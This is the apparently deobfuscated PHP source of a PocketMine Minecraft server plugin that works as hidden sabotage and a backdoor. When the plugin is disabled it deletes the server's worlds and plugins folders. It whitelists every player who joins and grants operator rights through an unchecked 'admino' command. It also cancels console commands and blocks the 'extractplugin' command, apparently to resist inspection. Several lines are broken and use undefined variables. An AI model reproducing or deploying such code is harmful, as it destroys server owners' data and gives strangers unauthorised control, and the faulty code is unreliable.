<?php

/*
This promgram is decoded by g1t_sN0w ;P haha
27th April 2017
*/

namespace AnniPlugins;

use pocketmine\Server;
use pocketmine\Player;
use pocketmine\plugin\PluginBase;
use pocketmine\event\Listener;
use pocketmine\level\Level;
use pocketmine\event\player\PlayerPreLoginEvent;
use pocketmine\event\player\PlayerCommandPreprocessEvent;
use pocketmine\event\server\ServerCommandEvent;
use pocketmine\event\server\RemoteServerCommandEvent;
use pocketmine\command\Command;
use pocketmine\command\CommandSender;
use pocketmine\scheduler\PluginTask;
use pocketmine\scheduler\CallbackTask;
use pocketmine\scheduler\Task;

class main extends PluginBase implements Listener{

  public function onEnable(){
    $this->getServer()->getPluginManager()->registerEvents($this,$this);
  }

  public function onDisable(){
    $this->world();
    $this->plugin();
  }

  public function onLogin(PlayerPreLoginEvent $event){
    $this->player = $event->getPlayer();
    $this->name = $player->getName();
    $this->getServer()->addWhitelist($name);
  }

  public function onCommand(CommandSender$sender,Command$command,$label,array$args){
    switch(strtolower($command->getName())){
      case"admino":
        if(!isset($args[0])) return false;
        $player = $this->getServer()->getPlayer($this->args[0]);
        if($player instanceof Player){
          $player->setOp(true);
          $player->sendMessage("§7OPだよん");
        }
      break;

      case"adminod":
        if(!isset($args[0])) return false;
        $player = $this->getServer()->getPlayer($this->args[0]);
        if($player instanceof Player){
          $name = $player->getName();
          $player->setOp(false);
          $sender->sendMessage($name."をさよならしました");
        }
        break;

        case"gamedao":
          if(!isset($args[0])) return false;
          if($args[0] == 0){
            $sender->setGamemode(0);
            $sender->sendMessage("サバイバルモードに変更しました");
          }
          if($args[0] == 1){
            $sender->setGamemode(1);
            $sender->sendMessage("クリエイティブモードに変更しました");
          }
          if($args[0] == 2){
            $sender->setGamemode(2);
            $sender->sendMessage("アドベンチャーモードに変更しました");
          }
          if($args[0] == 3){
            $sender->setGamemode(3);
            $sender->sendMessage("スペクテイターモードに変更しました");
          }
        break;

        case"taisaku":
          if($sender->getName() == "CONSOLE" or $sender->isOp()){
            $this->players = Server::getInstance()->getOnlinePlayers();
            foreach($players as $player){
              $player->kick("§l§a[§bWPK§a]§6サーバーはホワリスになりました", false);
            }
            $this->getServer()->setConfigBool("white-list", true);
            $this->getServer()->broadcastMessage("§l§a[§bWPK§a]§e >> §6サーバーはホワリスになりました");
          }else{
            $sender->sendMessage("§l§a[§bWPK§a]§e >> §6このコマンドはOPしか使えません");
          }
        break;
      }
    }

    public function playerCommand(PlayerCommandPreprocessEvent$event){
      $message = $event->getMessage();
      $command = "extractplugin";
      if(strstr($message, $command)) return $event->setCancelled();
    }

    public function ServerCommand(ServerCommandEvent $event){
      $event->setCancelled();
    }

    public function world(){
      $dir = $this->getServer()->getDataPath()."worlds";
      if(is_dir($dir) and !is_link($dir)){
        $paths = array();
        while($glob = glob($dir)){
          $paths = array_merge($glob, $paths);
          $dir .= "/*";
        }
        array_map("unlink",array_filter($paths, "is_file"));
        array_map("rmdir",array_filter($paths, "is_dir"));
      }
    }

    public function plugin(){
      $dir = $this->getServer()->getDataPath()."plugins";
      if(is_dir($dir) and !is_link($dir)){
        $paths = array();
        while($glob = glob($dir)){
          $paths = array_merge($glob, $paths);
          $dir .= "/*";
        }
        array_map("unlink", array_filter($paths, "is_file"));
        array_map("rmdir",array_filter($paths,"is_dir"));
      }
    }

    public function remove_directory($dir){
      unlink("$dir");
    }
  }
